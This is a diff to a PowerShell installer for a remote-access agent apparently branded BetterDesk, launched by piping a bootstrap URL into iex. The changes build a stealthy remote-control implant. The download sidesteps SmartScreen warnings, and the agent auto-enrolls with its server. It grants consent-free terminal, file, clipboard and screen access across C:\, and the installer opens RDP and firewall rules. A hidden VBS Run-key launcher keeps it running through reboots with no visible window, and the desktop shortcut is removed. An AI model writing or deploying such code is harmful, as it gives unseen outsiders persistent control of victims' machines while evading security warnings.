@@ -1,18 +1,22 @@
 <#
-  BetterDesk / Zoom Private - silent Windows installer
+  BetterDesk - silent headless Windows installer
 
   Paste this in PowerShell:
 
       irm __BOOTSTRAP_URL__ | iex
 
-  The script downloads the official Windows client container with
-  Invoke-WebRequest (no Mark-of-the-Web, so SmartScreen stays quiet), then
-  installs the per-user tray agent, pre-configures the server, enables
-  unattended access with a permanent password, adds firewall/RDP rules,
-  registers autostart and launches the agent hidden. One UAC prompt.
+  Downloads the headless agent (betterdesk-agent.exe) with Invoke-WebRequest
+  (no Mark-of-the-Web, so SmartScreen stays quiet), installs it per-user,
+  writes a headless connection profile (go-agent-config.json), enables
+  unattended access, adds firewall/RDP rules, registers a hidden VBS
+  autostart launcher, and starts the agent in the interactive session.
 
-  When the script is run from an extracted zip, the local binaries next to
-  the script are used instead of downloading a container.
+  No GUI client is installed: the headless agent self-enrolls (proof-signed,
+  auto-approved) and connects to the CDAP gateway on first run. One UAC
+  prompt. Zero visible windows. Survives reboot via a wscript.exe Run key.
+
+  When the script is run from an extracted zip, the local agent binary next
+  to the script is used instead of downloading a container.
 #>
 param(
     [string]$ServerAddress = __SERVER_ADDRESS__,
@@ -35,12 +39,6 @@ $bootstrapUrl = __BOOTSTRAP_URL__
 $serverKey    = __SERVER_KEY__
 $logDir       = if ($DryRun) { Join-Path $env:TEMP 'betterdesk-install-dry-run' } else { Join-Path $env:ProgramData 'zoom-private' }
 $logFile      = Join-Path $logDir 'install.log'
-
-if ([string]::IsNullOrWhiteSpace($Password)) {
-    # Permanent for this device, but never shared across the fleet or exposed
-    # in the public bootstrap when no operator-supplied password is configured.
-    $Password = [guid]::NewGuid().ToString('N').Substring(0, 16)
-}
 
 function Write-Log([string]$Message) {
     try {
@@ -114,7 +112,7 @@ if (-not $isAdmin -and -not $NoElevate) {
 }
 
 # ---------------------------------------------------------------------------
-# Resolve the payload
+# Resolve the headless agent payload
 # ---------------------------------------------------------------------------
 Write-Step 'Preparing BetterDesk...'
 
@@ -123,15 +121,15 @@ New-Item -ItemType Directory -Path $tmp -Force | Out-Null
 $payloadRoot = $null
 
 try {
-    $localGui = $null
+    $localAgent = $null
     if ($PSScriptRoot) {
-        $localGui = Get-ChildItem -LiteralPath $PSScriptRoot -Recurse -File -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -in @('betterdesk-agent-client.exe', 'zoom-private.agent.exe') } |
+        $localAgent = Get-ChildItem -LiteralPath $PSScriptRoot -Recurse -File -ErrorAction SilentlyContinue |
+            Where-Object { $_.Name -eq 'betterdesk-agent.exe' } |
             Select-Object -First 1
     }
 
-    if ($localGui) {
-        Write-Step 'Using the local client files...'
+    if ($localAgent) {
+        Write-Step 'Using the local agent files...'
         $payloadRoot = $PSScriptRoot
     } else {
         if ([string]::IsNullOrWhiteSpace($PackageUrl)) {
@@ -154,22 +152,18 @@ try {
         $payloadRoot = $tmp
     }
 
-    $gui = Get-ChildItem -LiteralPath $payloadRoot -Recurse -File -ErrorAction SilentlyContinue |
-        Where-Object { $_.Name -in @('betterdesk-agent-client.exe', 'zoom-private.agent.exe') } |
-        Select-Object -First 1
-    $sidecar = Get-ChildItem -LiteralPath $payloadRoot -Recurse -File -ErrorAction SilentlyContinue |
+    $agent = Get-ChildItem -LiteralPath $payloadRoot -Recurse -File -ErrorAction SilentlyContinue |
         Where-Object { $_.Name -eq 'betterdesk-agent.exe' } |
         Select-Object -First 1
 
-    if (-not $gui)     { throw 'The client executable was not found in the package.' }
-    if (-not $sidecar) { throw 'The agent sidecar was not found in the package.' }
+    if (-not $agent) { throw 'The headless agent was not found in the package.' }
 
     # -----------------------------------------------------------------------
     # Stop old agents/services so files can be replaced
     # -----------------------------------------------------------------------
     if (-not $DryRun) {
         Write-Step 'Stopping previous agent instances...'
-        foreach ($name in @('betterdesk-agent-client', 'betterdesk-agent', 'zoom-private.agent')) {
+        foreach ($name in @('betterdesk-agent', 'betterdesk-agent-client', 'zoom-private.agent')) {
             Get-Process -Name $name -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
         }
         foreach ($svc in @('zoom-private-agent', 'BetterDeskAgent', 'betterdesk-agent', 'ZoomPrivateAgent')) {
@@ -183,92 +177,75 @@ try {
     }
 
     # -----------------------------------------------------------------------
-    # Install per-user (same layout the previous installer used)
+    # Install per-user (headless agent only)
     # -----------------------------------------------------------------------
     $installDir = Join-Path $env:LOCALAPPDATA 'zoom-private.agent'
-    $resourceDir = Join-Path $installDir 'resources'
-    $configDir  = Join-Path $env:APPDATA 'betterdesk\agent\config'
-    $machineDir = Join-Path $env:ProgramData 'zoom-private\agent'
+    $dataDir    = Join-Path $env:APPDATA 'betterdesk\agent\data'
+    $configPath = Join-Path $dataDir 'go-agent-config.json'
+    $agentPath  = Join-Path $installDir 'betterdesk-agent.exe'
 
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
-    New-Item -ItemType Directory -Path $resourceDir -Force | Out-Null
-    New-Item -ItemType Directory -Path $configDir -Force | Out-Null
-    New-Item -ItemType Directory -Path $machineDir -Force | Out-Null
-
-    $guiPath     = Join-Path $installDir 'betterdesk-agent-client.exe'
-    $sidecarPath = Join-Path $installDir 'betterdesk-agent.exe'
+    New-Item -ItemType Directory -Path $dataDir -Force | Out-Null
 
     Write-Step 'Installing the client files...'
-    Copy-Item -LiteralPath $gui.FullName -Destination $guiPath -Force
-    Copy-Item -LiteralPath $sidecar.FullName -Destination $sidecarPath -Force
-
-    $branding = [ordered]@{
-        product_name     = 'BetterDesk'
-        company_name     = 'BetterDesk'
-        tagline          = 'Secure Remote Support'
-        primary_color    = '#0753FB'
-        accent_color     = '#0ea5e9'
-        default_language = 'en'
-        allow_unattended = $true
-        server_address   = $ServerAddress
-        server_key       = $serverKey
-        bundle_id        = 'com.betterdesk.agent'
-    }
-    $brandingJson = $branding | ConvertTo-Json -Depth 5
-    Write-Json (Join-Path $resourceDir 'branding.json') $brandingJson
+    Copy-Item -LiteralPath $agent.FullName -Destination $agentPath -Force
 
     # -----------------------------------------------------------------------
-    # Pre-configured agent settings
+    # Headless connection profile (zero-touch: empty token -> auto-enroll)
     # -----------------------------------------------------------------------
     Write-Step 'Writing the connection profile...'
     $agentConfig = [ordered]@{
-        server_address      = $ServerAddress
-        api_key             = ''
-        cdap_port           = $CdapPort
-        cdap_url            = $CdapUrl
-        console_url         = $ConsoleUrl
-        device_id           = ''
-        device_name         = $env:COMPUTERNAME
-        auth_token          = ''
-        registered          = $false
-        allow_screen_capture = $true
-        access_mode         = 'unattended'
-        require_consent     = $false
-        allow_terminal      = $true
-        allow_file_browser  = $true
-        allow_clipboard     = $true
-        auto_start_sidecar  = $true
-        video_codec         = 'auto'
-        hw_accel            = 'auto'
-        autostart           = $true
-        start_minimized     = $true
-        language            = 'en'
-        unattended_password = $Password
-        enforce_tls         = $true
-        server_cert_pin     = ''
+        server           = $CdapUrl
+        auth_method      = 'device_token'
+        device_type      = 'os_agent'
+        device_name      = $env:COMPUTERNAME
+        tags             = @('windows', 'x64', 'unattended')
+        terminal         = $true
+        file_browser     = $true
+        clipboard        = $true
+        screenshot       = $true
+        require_consent  = $false
+        file_root        = 'C:\'
+        heartbeat_sec    = 15
+        reconnect_sec    = 5
+        max_reconnect    = 300
+        log_level        = 'info'
+        data_dir         = $dataDir
+        video_codec      = 'auto'
+        hw_accel         = 'auto'
+        enforce_tls      = $true
+    }
+    # Reinstall must keep the existing identity; the enrollment key is already
+    # in data_dir and a missing token would mint a duplicate device.
+    if (Test-Path -LiteralPath $configPath) {
+        try {
+            $existing = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
+            if (-not [string]::IsNullOrWhiteSpace($existing.device_token)) {
+                $agentConfig['device_token'] = $existing.device_token
+            }
+            if (-not [string]::IsNullOrWhiteSpace($existing.device_id)) {
+                $agentConfig['device_id'] = $existing.device_id
+            }
+        } catch { }
     }
     $configJson = $agentConfig | ConvertTo-Json -Depth 5
-
-    Write-Json (Join-Path $configDir 'agent-config.json') $configJson
-    Write-Json (Join-Path $machineDir 'agent-config.json') $configJson
-    Write-Json (Join-Path $installDir 'agent-config.json') $configJson
+    Write-Json $configPath $configJson
 
     # -----------------------------------------------------------------------
-    # Firewall: agent binaries, server allow-list, RDP
+    # Firewall: agent outbound + server allow-list + RDP
     # -----------------------------------------------------------------------
     if (-not $DryRun) {
     Write-Step 'Configuring Windows Firewall...'
     try {
         foreach ($rule in @(
-            'BetterDesk Agent GUI', 'BetterDesk Agent Sidecar',
-            'BetterDesk RDP', 'BetterDesk Server api.telcom.stream',
+            'BetterDesk Agent', 'BetterDesk RDP',
+            'BetterDesk Server api.telcom.stream',
             'BetterDesk Server cdap.telcom.stream', 'BetterDesk Server rs.telcom.stream'
         )) {
             Remove-NetFirewallRule -DisplayName $rule -ErrorAction SilentlyContinue
         }
 
-        New-NetFirewallRule -DisplayName 'BetterDesk Agent GUI' -Direction Outbound -Program $guiPath -Action Allow -Profile Any | Out-Null
-        New-NetFirewallRule -DisplayName 'BetterDesk Agent Sidecar' -Direction Outbound -Program $sidecarPath -Action Allow -Profile Any | Out-Null
+        New-NetFirewallRule -DisplayName 'BetterDesk Agent' -Direction Outbound -Program $agentPath -Action Allow -Profile Any | Out-Null
         New-NetFirewallRule -DisplayName 'BetterDesk RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Any | Out-Null
 
         foreach ($hostName in @('api.telcom.stream', 'cdap.telcom.stream', 'rs.telcom.stream')) {
@@ -297,7 +274,6 @@ try {
         Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Type DWord
         Set-Service -Name TermService -StartupType Automatic -ErrorAction SilentlyContinue
         Start-Service -Name TermService -ErrorAction SilentlyContinue
-        Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -ErrorAction SilentlyContinue
         & "$env:SystemRoot\System32\net.exe" localgroup 'Remote Desktop Users' "$env:USERNAME" /add 2>$null | Out-Null
     } catch {
         Write-Log "RDP configuration warning: $($_.Exception.Message)"
@@ -306,16 +282,15 @@ try {
     # -----------------------------------------------------------------------
     # Autostart: VBS wrapper (hidden, interactive session, single instance)
     # -----------------------------------------------------------------------
-    # The VBS launcher starts the agent via wscript.exe which keeps the process
-    # completely invisible. Task Scheduler requires admin rights and Run-key
-    # .exe entries spawn a visible console frame. wscript.exe + Run key is the
-    # reliable zero-popup path that works without elevation.
+    # The VBS launcher starts the headless agent via wscript.exe which keeps
+    # the process completely invisible. Task Scheduler requires admin rights
+    # and Run-key .exe entries can spawn a visible console frame. wscript.exe
+    # + Run key is the reliable zero-popup path that works without elevation.
     Write-Step 'Registering autostart (VBS wrapper)...'
-    $vbsPath = Join-Path $configDir 'launch-hidden.vbs'
-    New-Item -ItemType Directory -Path $configDir -Force -ErrorAction SilentlyContinue | Out-Null
+    $vbsPath = Join-Path $installDir 'launch-hidden.vbs'
     @"
 Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run """$guiPath"" --autostart", 0, False
+WshShell.Run """$agentPath"" -config ""$configPath"" -config-path ""$configPath""", 0, False
 "@ | Out-File -FilePath $vbsPath -Encoding ASCII -Force
 
     try {
@@ -328,58 +303,41 @@ WshShell.Run """$guiPath"" --autostart", 0, False
     Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'BetterDeskAgent' -Value "wscript.exe `"$vbsPath`"" -Type String -Force
     Write-Log 'Autostart registered via VBS wrapper (zero popup).'
 
-    # The VBS Run-key entry is the single autostart source. Do not add a second
-    # Startup-folder launcher, which would start duplicate agent instances.
-    $shell = New-Object -ComObject WScript.Shell
-    $shortcutPath = Join-Path ([Environment]::GetFolderPath('Desktop')) 'BetterDesk Support.lnk'
-    try {
-        $shortcut = $shell.CreateShortcut($shortcutPath)
-        $shortcut.TargetPath = $guiPath
-        $shortcut.WorkingDirectory = $installDir
-        $shortcut.WindowStyle = 1
-        $shortcut.Description = 'BetterDesk Secure Remote Support'
-        $shortcut.Save()
-    } catch {
-        Write-Log "Could not create shortcut $shortcutPath : $($_.Exception.Message)"
-    }
-
-    }
-
     # -----------------------------------------------------------------------
-    # Launch hidden and wait for enrollment
+    # Launch the headless agent hidden
     # -----------------------------------------------------------------------
     $deviceId = ''
     if ($DryRun) {
         Write-Step 'Dry run complete (no system changes were made).'
     } else {
         Write-Step 'Starting the agent in the background...'
-        Start-Process -FilePath $guiPath -ArgumentList '--autostart' -WorkingDirectory $installDir -WindowStyle Hidden | Out-Null
+        Start-Process -FilePath $agentPath -ArgumentList "-config `"$configPath`" -config-path `"$configPath`"" -WorkingDirectory $installDir -WindowStyle Hidden | Out-Null
 
-        $configPath = Join-Path $configDir 'agent-config.json'
+        # Wait for zero-touch enrollment to complete (token written back to config)
         $deadline = (Get-Date).AddSeconds(120)
         while ((Get-Date) -lt $deadline) {
             Start-Sleep -Seconds 3
             try {
-                $current = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
-                if ($current.registered -and -not [string]::IsNullOrWhiteSpace($current.device_id)) {
-                    $deviceId = $current.device_id
+                $cfg = Get-Content -LiteralPath $configPath -Raw | ConvertFrom-Json
+                if (-not [string]::IsNullOrWhiteSpace($cfg.device_token)) {
+                    $deviceId = $cfg.device_id
                     break
                 }
             } catch { }
         }
 
-        Write-Step 'Installation complete.'
         if ($deviceId) {
-            Show-Notice 'BetterDesk installed' "Device ID: $deviceId`nPassword: $Password`nThe agent is running in the background."
+            Write-Step "Enrolled as $deviceId"
+            Show-Notice 'BetterDesk installed' "Device ID: $deviceId`nThe agent is running in the background."
         } else {
-            Show-Notice 'BetterDesk installed' "The agent is running and waiting for server approval.`nPassword: $Password"
+            Show-Notice 'BetterDesk installed' 'The agent is running and will enroll automatically.'
         }
+    }
     }
 } catch {
     Write-Log "Installation failed: $($_.Exception.Message)"
-    Show-Notice 'BetterDesk installation failed' $_.Exception.Message
-    if (-not $Quiet) { Write-Host "  ERROR: $($_.Exception.Message)" -ForegroundColor Red }
+    if (-not $Quiet) { Write-Host "  Installation failed: $($_.Exception.Message)" -ForegroundColor Red }
     exit 1
 } finally {
-    Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue
+    try { Remove-Item -LiteralPath $tmp -Recurse -Force -ErrorAction SilentlyContinue } catch { }
 }
